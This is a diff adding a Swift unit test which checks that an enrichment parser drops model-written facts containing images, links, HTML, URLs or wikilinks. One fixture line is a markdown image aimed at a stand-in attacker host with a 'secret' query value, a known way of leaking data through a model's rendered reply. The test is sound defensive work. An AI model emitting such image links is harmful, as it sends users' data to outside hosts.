@@ -140,6 +140,21 @@ struct EnrichmentTests {
         #expect(facts == [EnrichmentFact(bullet: 1, text: "Idle connections close after sixty seconds", sources: [1])])
     }
 
+    @Test("a fact with an image, link, HTML, URL, or wikilink is dropped")
+    func factMarkupDropped() {
+        let reply = """
+        B1:
+        - Idle connections close ![x](https://evil.example/?d=secret) [1]
+        - Idle connections close [here](notes.md) [1]
+        - Idle connections close <img src=x> [1]
+        - Idle connections close, see https://evil.example [1]
+        - Idle connections close, see [[Other note]] [1]
+        - Idle connections close after sixty seconds [1]
+        """
+        let facts = Enrichment.facts(in: reply, bulletCount: 1, passages: passages)
+        #expect(facts.map(\.text) == ["Idle connections close after sixty seconds"])
+    }
+
     @Test("it reads a few ways models write the header, and several citations")
     func replyShapes() {
         let reply = "**B1:** Invoices go out monthly [2]\nB2:\n* Idle connections close [1, 2]"
